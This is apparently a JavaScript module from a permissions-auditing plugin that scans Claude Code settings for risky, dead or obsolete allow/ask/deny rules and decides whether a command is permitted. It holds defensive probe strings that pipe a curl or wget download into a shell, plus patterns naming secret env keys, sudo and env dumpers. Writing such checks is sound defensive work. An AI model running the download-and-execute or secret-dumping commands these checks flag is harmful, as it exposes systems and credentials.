// Finding catalogue (spec §4) as pure functions over loadScopes() output, plus
// decide() for advisor mode. Severity is fixed per id; no judgement calls.
//
// Ids added after 3.0: R13 (high) = an open allow for sudo/doas/su (runs any
// command as root or another user; nothing a narrower rule can contain).

import { matchRule, parseRule, splitCompound, stripWrappers, analyzeCommand, resolvePathPattern } from "./rule-matcher.mjs";
import { homedir } from "node:os";

const D = "https://code.claude.com/docs/en";
const DOC = {
  modes: `${D}/permission-modes#eliminate-prompts-with-auto-mode`,
  modesP4: `${D}/permission-modes`,
  perms: `${D}/permissions`,
  mcp: `${D}/permissions#mcp`,
  settings: `${D}/settings#settings-precedence`,
  settingsRef: `${D}/settings`,
  pluginEnv: `${D}/plugins-reference#environment-variables`,
};

const SEVERITY = {
  R1: "high", R2: "high", R3: "high", R4: "high", R5: "high", R13: "high",
  R6: "med", R7: "med", R8: "med", R9: "med", R10: "med",
  R11: "low", R12: "info",
  D1: "dead", D2: "dead", D3: "dead", D4: "dead", D5: "dead", D6: "dead", D7: "dead", D8: "dead",
  L2: "med", L3: "info",
};

const WRAPPERS = new Set(["command", "time", "timeout", "nice", "nohup", "stdbuf", "builtin", "noglob", "xargs"]);
const INTERPRETERS = new Set(["python", "python3", "node", "ruby", "perl", "deno", "bun", "php"]);
const SHELLS = new Set(["bash", "sh", "zsh"]);
const SECRET_KEY = /KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL/i;
const WRITE_VERBS = /(create|update|delete|post|send|comment|transition|run|execute|click|type|navigate|evaluate|fill|upload)/i;
const ELEVATORS = new Set(["sudo", "doas", "su"]);
// Runners that execute whatever follows them (not stripped by Claude Code, so a
// wildcard rule for them is an open door). [phrase words, max extra words after].
const RUNNER_PHRASES = [
  ["env", 0], ["npx", 1], ["bunx", 1], ["pnpx", 1], ["pnpm dlx", 1], ["yarn dlx", 1],
  ["nvm exec", 0], ["nvm run", 0], ["fnm exec", 0], ["volta run", 0], ["asdf exec", 0],
  ["mise exec", 0], ["mise x", 0], ["pyenv exec", 0], ["rbenv exec", 0], ["direnv exec", 0],
  ["uv run", 0], ["poetry run", 0], ["bundle exec", 0],
];
function runnerPhrase(words, wild) {
  if (!wild) return null;
  for (const [phrase, extra] of RUNNER_PHRASES) {
    const pw = phrase.split(" ");
    if (pw.every((w, i) => words[i] === w) && words.length <= pw.length + extra) return phrase;
  }
  return null;
}
const FILE_READERS = new Set(["cat", "head", "tail", "sed", "tee"]);

// ---- helpers --------------------------------------------------------------

// Cut at a word boundary, ellipsis included, never past `max` characters.
function clip(text, max) {
  if (text.length <= max) return text;
  const cut = text.slice(0, max - 3);
  const sp = cut.lastIndexOf(" ");
  return (sp > max * 0.5 ? cut.slice(0, sp) : cut).replace(/[\s,;:.]+$/, "") + "...";
}

// extra: { severity, doc, list ("allow"|"deny"|"ask"), coveredBy, noClip }
function finding(id, entry, rule, why, extra = {}) {
  const f = {
    id,
    severity: extra.severity ?? SEVERITY[id],
    scope: entry.scope ?? null,
    file: entry.file ?? null,
  };
  if (extra.list) f.list = extra.list;
  f.rule = rule;
  f.why = extra.noClip ? why : clip(why, 140);
  if (extra.coveredBy) f.coveredBy = extra.coveredBy;
  f.doc = extra.doc;
  return f;
}

// Bash rule -> { body, wild, arg } or null (non-Bash or bare "Bash").
function bashRule(rule) {
  const p = parseRule(rule);
  if (!p || p.tool !== "Bash" || p.arg === null) return null;
  const arg = p.arg;
  let body = arg;
  let wild = false;
  if (arg.endsWith(":*")) {
    body = arg.slice(0, -2);
    wild = true;
  } else if (arg.endsWith(" *")) {
    body = arg.slice(0, -2);
    wild = true;
  } else if (arg.endsWith("*")) {
    body = arg.slice(0, -1);
    wild = true;
  }
  return { body: body.trim(), wild, arg };
}

const firstWord = (s) => (s.trim().split(/\s+/)[0] ?? "");

function isBareBash(rule) {
  const p = parseRule(rule);
  return !!p && p.tool === "Bash" && (p.arg === null || p.arg === "*" || p.arg === "");
}

// Server name from an MCP rule/tool name without parentheses; null if not a server-level rule.
function mcpServerWildcard(rule) {
  if (!rule.startsWith("mcp__") || rule.includes("(")) return null;
  let rest = rule.slice(5);
  if (rest.endsWith("__*")) rest = rest.slice(0, -3);
  if (!rest || rest.includes("__") || rest.includes("*")) return null;
  return rest;
}

function mcpServerOf(name) {
  if (!name.startsWith("mcp__")) return null;
  return name.slice(5).split("__")[0] || null;
}

const tokens = (s) => s.toLowerCase().split(/[^a-z0-9]+/).filter(Boolean);

const EDIT_FAMILY = new Set(["Edit", "Write", "MultiEdit", "NotebookEdit"]);
const normTool = (t) => (EDIT_FAMILY.has(t) ? "Edit" : t);

const WIDTH = { managed: 3, user: 2, projectShared: 1, projectLocal: 0 };

// Does rule entry B cover everything rule entry A matches (B != A)?
// Entries are { rule, scope }; scope decides what a leading "/" means in path rules.
function covers(be, ae, ctx = {}) {
  const b = be.rule;
  const a = ae.rule;
  const pb = parseRule(b);
  const pa = parseRule(a);
  if (!pb || !pa || normTool(pb.tool) !== normTool(pa.tool)) return false;
  if (pb.arg === null) return true;
  if (pa.arg === null) return false;
  if (pb.tool === "Bash") {
    const ba = bashRule(a);
    const bb = bashRule(b);
    if (!ba || !bb) return false;
    if (!bb.wild) return false;
    return matchRule(b, { tool: "Bash", detail: ba.body, anyEnv: true });
  }
  if (pa.arg.includes("*") && !pb.arg.includes("*")) return false;
  const home = ctx.home || homedir();
  const cwd = ctx.cwd || "/__project__";
  const pc = (e) => ({ cwd, home, root: e.scope === "user" ? `${home}/.claude` : cwd });
  const ra = resolvePathPattern(pa.arg, pc(ae));
  const detail = ra.glob ?? `${cwd}/**/${ra.anyDepth}`;
  return matchRule(b, { tool: pb.tool, detail, ...pc(be) });
}

// ---- checks ---------------------------------------------------------------

export function runChecks(loaded, opts = {}) {
  const { seenTools, home = "", pluginDataDirs, selfDataDir } = opts;
  const eff = loaded.effective;
  const scopes = loaded.scopes ?? [];
  const out = [];
  const push = (f) => out.push(f);

  const allow = eff.allow;
  const pctx = { home: home || homedir() };
  const askDeny = [...eff.ask, ...eff.deny];

  // ---- R1, R2, R3, R6, R7, R8, R13 (Bash allow rules)
  const L = { list: "allow" };
  let shellOrInterp = false; // an R1/R2-class allow exists (gates R8)
  const curlRules = [];
  for (const e of allow) {
    const r = e.rule;
    if (isBareBash(r) || (bashRule(r) && SHELLS.has(bashRule(r).body) && bashRule(r).wild)) {
      shellOrInterp = true;
      push(finding("R1", e, r, "Allows any shell command; auto mode drops this rule and it defeats every narrower rule.", { doc: DOC.modes, ...L }));
    }
    const b = bashRule(r);
    if (!b) continue;
    const words = b.body.split(/\s+/).filter(Boolean);
    const fw = firstWord(b.body);
    const open = b.arg.includes("*"); // literal rules allow one exact command only
    if (open && INTERPRETERS.has(fw) && (b.wild || /\s-[ce]\b/.test(" " + b.body))) {
      shellOrInterp = true;
      push(finding("R2", e, r, `Lets ${fw} run arbitrary code; wildcarded interpreter allows are dropped in auto mode.`, { doc: DOC.modes, ...L }));
    }
    const sourcesFile = (fw === "source" || fw === ".") && (b.wild || words.length > 1); // literals fire too: file contents can change
    const runner = open && runnerPhrase(words, b.wild);
    if (sourcesFile || runner || (open && (/\b(sh|bash|zsh)\s+-c\b/.test(b.arg) || fw === "eval"))) {
      const what = runner ? `${runner} runs whatever command follows it` : "Runs a string or file as shell code (sh -c, eval, source)";
      push(finding("R3", e, r, `${what}, bypassing per-command matching.`, { doc: DOC.perms, ...L }));
    }
    if (ELEVATORS.has(fw) && (b.wild || words.length === 1)) {
      push(finding("R13", e, r, `Allows running any command via ${fw}, as root or another user; nothing narrower can contain it.`, { doc: DOC.perms, ...L }));
    }
    if (b.wild && (fw === "rm" || fw === "kill" || fw === "pkill")) {
      push(finding("R6", e, r, `Wildcard ${fw} allow can delete files or kill processes without a prompt.`, { doc: DOC.perms, ...L }));
    }
    if (b.wild && b.body === "git") {
      const pushCovered = askDeny.some((x) => matchRule(x.rule, { tool: "Bash", detail: "git push origin main", anyEnv: true }));
      if (!pushCovered) {
        push(finding("R7", e, r, "Allows every git subcommand including push, with no ask or deny rule for git push.", { doc: DOC.perms, ...L }));
      }
    }
    if (open && (fw === "curl" || fw === "wget")) curlRules.push({ e, fw });
  }
  // R8: only a risk when something that can run the download is also allowed.
  // Deny rules are judged per pipeline segment (Claude Code splits on |), so an
  // unmatchable pipe rule like Bash(curl * | sh) never counts as mitigation.
  if (shellOrInterp && curlRules.length > 0) {
    const probes = ["curl http://x.invalid/i | sh", "curl http://x.invalid/i | bash", "wget -O- http://x.invalid/i | sh"];
    const covered = probes.some((d) =>
      splitCompound(d).some((seg) => eff.deny.some((x) => matchRule(x.rule, { tool: "Bash", detail: seg, anyEnv: true }))),
    );
    if (!covered) {
      for (const { e, fw } of curlRules) {
        push(finding("R8", e, e.rule, `${fw} is allowed alongside a shell or interpreter, with no deny rule that blocks piping downloads into a shell.`, { doc: DOC.perms, ...L }));
      }
    }
  }

  // ---- R4: secret env key + allow of env dumpers
  const secretKeys = eff.env.filter((x) => SECRET_KEY.test(x.key));
  if (secretKeys.length > 0) {
    for (const e of allow) {
      const b = bashRule(e.rule);
      const bare = parseRule(e.rule);
      const dumps =
        (b && (["printenv", "env", "set"].includes(firstWord(b.body)) || /^export\s+-p\b/.test(b.body))) ||
        (bare && bare.tool === "Bash" && bare.arg && /^(printenv|env|set)$/.test(bare.arg));
      if (dumps) {
        push(finding("R4", e, e.rule, `Env holds ${secretKeys[0].key} and this allow can print it to the transcript.`, { doc: DOC.perms, list: "allow" }));
      }
    }
  }

  // ---- R5: bypassPermissions as user default
  for (const s of scopes) {
    if (s.name === "user" && s.data) {
      const dm = s.data.permissions?.defaultMode ?? s.data.defaultMode;
      if (dm === "bypassPermissions") {
        push(finding("R5", { scope: "user", file: s.file }, "defaultMode: bypassPermissions", "Every session starts with all permission checks off.", { doc: DOC.modesP4 }));
      }
    }
  }

  // ---- R9 / D3 (MCP)
  const mcpEntries = [...allow, ...eff.ask, ...eff.deny];
  for (const e of allow) {
    const srv = mcpServerWildcard(e.rule);
    if (!srv) continue;
    if (Array.isArray(seenTools)) {
      const writer = seenTools.find((t) => mcpServerOf(t) === srv && WRITE_VERBS.test(t.slice(5 + srv.length + 2)));
      if (writer) {
        push(finding("R9", e, e.rule, `Wildcard covers write-capable tool ${writer}; allow only the read tools.`, { doc: DOC.mcp, list: "allow" }));
      }
    } else {
      push(finding("R9", e, e.rule, "MCP server wildcard allows every tool, including any that write.", { severity: "low", doc: DOC.mcp, list: "allow" }));
    }
  }
  if (Array.isArray(seenTools)) {
    const seenServers = new Set(seenTools.map(mcpServerOf).filter(Boolean));
    for (const e of mcpEntries) {
      if (!e.rule.startsWith("mcp__") || e.rule.includes("(")) continue;
      const lst = eff.allow.includes(e) ? "allow" : eff.ask.includes(e) ? "ask" : "deny";
      const srv = e.rule.slice(5).split("__")[0].replace(/\*$/, "");
      if (!srv || seenServers.has(srv)) continue;
      const st = tokens(srv);
      const lookalike = [...seenServers].find((o) => {
        const ot = tokens(o);
        return st.length > 0 && st.every((t) => ot.includes(t));
      });
      if (lookalike) {
        push(finding("D3", e, e.rule, `Server "${srv}" never seen, but "${lookalike}" was; the rule likely never matches.`, { doc: DOC.mcp, list: lst }));
      }
    }
  }

  // ---- R10
  const homeNorm = home.replace(/\/+$/, "");
  const wideDir = (p) => {
    const q = p.replace(/\/+$/, "");
    return ["~", "$HOME", "~/.claude", "$HOME/.claude", homeNorm, `${homeNorm}/.claude`].filter(Boolean).includes(q);
  };
  const widePaths = eff.additionalDirectories.filter((d) => wideDir(d.path));
  if (widePaths.length > 0) {
    for (const e of allow) {
      if (e.rule === "Edit" || e.rule === "Write") {
        push(finding("R10", e, e.rule, `Unscoped ${e.rule} plus additionalDirectories ${widePaths[0].path} can rewrite settings and hooks.`, { doc: DOC.perms, list: "allow" }));
      }
    }
  }

  // ---- R11
  for (const e of allow) {
    if (e.rule === "WebFetch") push(finding("R11", e, e.rule, "Bare WebFetch allows any domain; prefer WebFetch(domain:example.com).", { doc: DOC.perms, list: "allow" }));
  }

  // ---- R12
  const skip = eff.flags?.skipDangerousModePermissionPrompt;
  if (skip && skip.value === true) {
    const s = scopes.find((x) => x.name === skip.scope && x.data);
    push(finding("R12", { scope: skip.scope, file: s?.file }, "skipDangerousModePermissionPrompt: true", "The bypass-mode warning is suppressed; fine for automation, risky on a daily machine.", { doc: DOC.perms }));
  }

  // ---- D1 (all lists)
  for (const list of ["allow", "ask", "deny"]) {
    for (const e of eff[list]) {
      const b = bashRule(e.rule);
      if (!b) continue;
      const fw = firstWord(b.body);
      // Claude Code does not strip `command -v` (a lookup) or xargs with flags, so
      // `Bash(command -v *)` and `Bash(xargs *)` can still match.
      const lookup = fw === "command" && /^command\s+-[vV]\b/.test(b.body);
      if (WRAPPERS.has(fw) && fw !== "xargs" && !lookup) {
        push(finding("D1", e, e.rule, `"${fw}" is stripped before matching, so this ${list} rule never matches.`, { doc: DOC.perms, list }));
      }
    }
  }

  // ---- D2
  for (const list of ["allow", "ask", "deny"]) {
    for (const e of eff[list]) {
      if (e.rule.startsWith("mcp__") && e.rule.includes("(")) {
        push(finding("D2", e, e.rule, "MCP rules cannot take parentheses; Claude Code skips this rule.", { doc: DOC.mcp, list }));
      }
    }
  }
  for (const e of allow) {
    if (e.rule === "mcp__*") push(finding("D2", e, e.rule, "Allow mcp__* is skipped with a warning; name each server.", { doc: DOC.mcp, list: "allow" }));
  }

  // ---- D4
  for (const s of scopes) {
    if (!s.data || (s.name !== "projectShared" && s.name !== "projectLocal")) continue;
    const dm = s.data.permissions?.defaultMode ?? s.data.defaultMode;
    if (dm === "auto" || dm === "bypassPermissions") {
      push(finding("D4", { scope: s.name, file: s.file }, `defaultMode: ${dm}`, "Project settings cannot set auto or bypass mode; Claude Code ignores this.", { doc: DOC.modesP4 }));
    }
    if (s.data.autoMode !== undefined) {
      push(finding("D4", { scope: s.name, file: s.file }, "autoMode", "autoMode is read only from user, managed or --settings; project value is ignored.", { doc: DOC.modesP4 }));
    }
  }

  // ---- D5 (dormant sandbox = info; permissions.sandbox = dead)
  for (const s of scopes) {
    if (!s.data) continue;
    const sb = s.data.sandbox;
    if (sb && typeof sb === "object" && Object.keys(sb).some((k) => k !== "enabled") && eff.sandbox.enabled !== true) {
      push(finding("D5", { scope: s.name, file: s.file }, "sandbox.*", "Sandbox settings are inert while sandbox.enabled is not true.", { severity: "info", doc: DOC.settingsRef }));
    }
    if (s.data.permissions && s.data.permissions.sandbox !== undefined) {
      push(finding("D5", { scope: s.name, file: s.file }, "permissions.sandbox", "Sandbox keys belong at top-level sandbox, not under permissions; this is ignored.", { doc: DOC.settingsRef }));
    }
  }

  // ---- D6
  for (const list of ["allow", "ask", "deny"]) {
    const seen = new Map();
    for (const e of eff[list]) {
      if (seen.has(e.rule)) {
        const first = seen.get(e.rule);
        push(finding("D6", e, e.rule, `Duplicate of the same ${list} rule in ${first.scope} scope.`, { doc: DOC.settings, list, coveredBy: first.rule }));
      } else seen.set(e.rule, e);
    }
  }
  for (const a of allow) {
    const shadow = eff.deny.find((d) => d.rule !== a.rule && covers(d, a, pctx));
    if (shadow) {
      push(finding("D6", a, a.rule, `Shadowed by deny rule ${shadow.rule} (${shadow.scope}); deny always wins.`, { doc: DOC.settings, list: "allow", coveredBy: shadow.rule }));
      continue;
    }
    // Equivalent rules (git:* vs git *) cover each other: flag only the later one.
    const broader = allow.find((b) => b.rule !== a.rule && (WIDTH[b.scope] ?? 0) >= (WIDTH[a.scope] ?? 0) && covers(b, a, pctx) &&
      !(covers(a, b, pctx) && allow.indexOf(b) > allow.indexOf(a)));
    if (broader) {
      push(finding("D6", a, a.rule, `Already covered by broader allow ${broader.rule} (${broader.scope}).`, { doc: DOC.settings, list: "allow", coveredBy: broader.rule }));
    }
  }

  // ---- D7
  const UUID = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i;
  for (const e of allow) {
    const r = e.rule;
    let reason = null;
    const tmp = r.match(/\/(?:private\/)?tmp\/[\w.\-/]*[\w.\-]/);
    if (/\bkill\s+(?:-\w+\s+)?\d+/.test(r)) reason = "a hard-coded PID";
    else if (tmp && r[tmp.index + tmp[0].length] !== "*") reason = "a specific /tmp path";
    else if (UUID.test(r)) reason = "a UUID";
    else if (/\/\.claude\/(?:projects|sessions|session-env|todos)\//.test(r)) reason = "a session path";
    else if (r.includes("\n")) reason = "a multi-line command";
    if (reason) push(finding("D7", e, r, `One-off rule containing ${reason}; it will never match again.`, { doc: DOC.perms, list: "allow" }));
  }

  // ---- D8 (P6: Read/Edit denies already cover cat/head/tail/sed/tee)
  const fileDenies = eff.deny.filter((d) => /^(Read|Edit|Write)\(/.test(d.rule));
  for (const e of eff.deny) {
    const b = bashRule(e.rule);
    if (!b) continue;
    const words = b.body.split(/\s+/);
    if (!FILE_READERS.has(words[0]) || words.length < 2) continue;
    const target = words[words.length - 1];
    if (!/^[~/.]/.test(target)) continue;
    const cover = fileDenies.find((d) =>
      matchRule(d.rule, { tool: parseRule(d.rule).tool, detail: target, home: home || homedir() }),
    );
    if (cover) {
      push(finding("D8", e, e.rule, `Redundant: ${cover.rule} already blocks ${words[0]} on this path (Claude Code applies Read denies to cat/head/tail/sed/tee).`, { doc: DOC.perms, list: "deny" }));
    }
  }

  // ---- L2
  const removed = /^Skill\((?:permissions:)?permissions-(?:audit|promote|lint|seed|bootstrap-project|sandbox-fix)(?::\*|\s\*)?\)$/;
  for (const s of scopes) {
    if (s.data && s.data.permissions && s.data.permissions.sandbox !== undefined) {
      push(finding("L2", { scope: s.name, file: s.file }, "permissions.sandbox", "Written by the removed sandbox-fix skill into the wrong key; move to top-level sandbox or delete.", { doc: DOC.settingsRef }));
    }
  }
  for (const list of ["allow", "ask", "deny"]) {
    for (const e of eff[list]) {
      if (removed.test(e.rule)) {
        push(finding("L2", e, e.rule, "Refers to a skill removed in permissions 3.0.", { doc: DOC.settingsRef, list }));
      } else if (list === "allow" && /\/plugins\/cache\/[^/]+\/permissions\//.test(e.rule)) {
        push(finding("L2", e, e.rule, "Points into an old permissions plugin cache directory that changes every version.", { doc: DOC.settingsRef, list }));
      }
    }
  }

  // ---- L3
  if (Array.isArray(pluginDataDirs)) {
    for (const name of pluginDataDirs) {
      // "-inline" dirs belong to --plugin-dir loads of this very plugin; keep them.
      if (/^(permissions|permission-advisor)-/.test(name) && name !== selfDataDir && !name.endsWith("-inline")) {
        push(finding("L3", { scope: "user", file: `${homeNorm}/.claude/plugins/data/${name}` }, name, `Orphaned data dir from an earlier install; delete with: rm -r ~/.claude/plugins/data/${name}`, { doc: DOC.pluginEnv, noClip: true }));
      }
    }
  }

  return out;
}

// ---- decide() ---------------------------------------------------------------

// Rule entry -> match context. "/path" rules anchor at ~/.claude for user
// settings and at the working directory otherwise (permissions docs).
function entryCtx(e, ctx) {
  return { cwd: ctx.cwd, home: ctx.home, root: e.scope === "user" ? `${ctx.home}/.claude` : ctx.cwd };
}

function firstMatch(list, entry, ctx) {
  for (const e of list) {
    if (matchRule(e.rule, { ...entry, ...entryCtx(e, ctx) })) return e;
  }
  return null;
}

// Strip quotes around a token and turn $HOME / ${HOME} into ~ so path rules see it.
function cleanTarget(t) {
  return t.replace(/^['"]|['"]$/g, "").replace(/^\$\{?HOME\}?(?=\/|$)/, "~");
}

// Read/Edit rules also apply to cat/head/tail/sed/tee args and to redirect
// targets (`>`, `>>`, `>|`, `&>`, `<`), quoted text excluded.
function fileTargets(segment) {
  const words = segment.split(/\s+/).filter(Boolean);
  const reads = [];
  if (FILE_READERS.has(words[0])) {
    let skippedScript = words[0] !== "sed";
    for (const w of words.slice(1)) {
      if (w.startsWith("-")) continue;
      if (!skippedScript) {
        skippedScript = true;
        continue;
      }
      reads.push(cleanTarget(w));
    }
  }
  const writes = [];
  let q = null;
  for (let i = 0; i < segment.length; i++) {
    const c = segment[i];
    if (q) {
      if (c === "\\" && q === '"') i++;
      else if (c === q) q = null;
      continue;
    }
    if (c === "\\") { i++; continue; }
    if (c === "'" || c === '"') { q = c; continue; }
    if (c !== ">" && c !== "<") continue;
    let j = i + 1;
    if (segment[j] === c) j++; // >> or <<
    if (c === ">" && segment[j] === "|") j++;
    if (segment[j] === "&" || segment[j] === "(" || segment[i - 1] === "$") { i = j; continue; } // fd dup / process substitution
    if (c === "<" && segment[i + 1] === "<") { i = j; continue; } // heredoc
    while (segment[j] === " " || segment[j] === "\t") j++;
    const m = /^(?:'[^']*'|"[^"]*"|[^\s<>&|;()]+)/.exec(segment.slice(j));
    if (m) (c === ">" ? writes : reads).push(cleanTarget(m[0]));
    i = j + (m ? m[0].length : 0) - 1;
  }
  if (words[0] === "tee") writes.push(...reads);
  return { reads, writes };
}

function matchBashSegment(list, segment, ctx) {
  const direct = firstMatch(list, { tool: "Bash", detail: segment, anyEnv: true }, ctx);
  if (direct) return direct;
  const { reads, writes } = fileTargets(segment);
  const inPlace = /^(sed|tee)$/.test(segment.split(/\s+/)[0]);
  for (const e of list) {
    const p = parseRule(e.rule);
    if (!p || p.arg === null) continue;
    const ec = entryCtx(e, ctx);
    const hit = (tool, targets) => targets.some((t) => matchRule(e.rule, { tool, detail: t, ...ec }));
    if (p.tool === "Read" && hit("Read", reads)) return e;
    if ((p.tool === "Edit" || p.tool === "Write") && (hit("Edit", writes) || (inPlace && hit("Edit", reads)))) return e;
  }
  return null;
}

// decide(cmdOrToolCall, effective, ctx?) -> { decision, rule?, scope?, reason? }
//   decision: deny | ask | allow | unmatched | unsure
// Fails closed: "allow" only when every simple command (including those nested in
// $( ), backticks, <( ), subshells, control-flow bodies, eval and sh -c strings)
// is matched by an allow rule and no construct defeats static analysis. A deny or
// ask found anywhere, including inside a substitution, still wins; otherwise any
// such construct yields "unsure". ctx: { cwd, home } for path rules.
export function decide(cmdOrToolCall, effective, ctxIn = {}) {
  const ctx = { cwd: ctxIn.cwd || process.cwd(), home: (ctxIn.home || homedir()).replace(/\/+$/, "") };
  const call = typeof cmdOrToolCall === "string" ? { tool: "Bash", detail: cmdOrToolCall } : cmdOrToolCall;
  const hit = (decision, e) => ({ decision, rule: e.rule, scope: e.scope });
  if (!call || typeof call.tool !== "string") return { decision: "unmatched" };

  if (call.tool !== "Bash") {
    for (const [decision, list] of [["deny", effective.deny], ["ask", effective.ask], ["allow", effective.allow]]) {
      const e = firstMatch(list, call, ctx);
      if (e) return hit(decision, e);
    }
    return { decision: "unmatched" };
  }

  const info = analyzeCommand(call.detail ?? "");
  const segments = info.items.map((t) => stripWrappers(t)).filter(Boolean);
  if (segments.length === 0) return info.unsure ? { decision: "unsure", reason: info.reasons.join("; ") } : { decision: "unmatched" };
  for (const [decision, list] of [["deny", effective.deny], ["ask", effective.ask]]) {
    for (const seg of segments) {
      const e = matchBashSegment(list, seg, ctx);
      if (e) return hit(decision, e);
    }
  }
  if (info.unsure) return { decision: "unsure", reason: info.reasons.join("; ") };
  let first = null;
  for (const t of info.items) {
    const seg = stripWrappers(t, { forAllow: true });
    const e = firstMatch(effective.allow, { tool: "Bash", detail: seg }, ctx);
    if (!e) return { decision: "unmatched" };
    first = first ?? e;
  }
  return hit("allow", first);
}
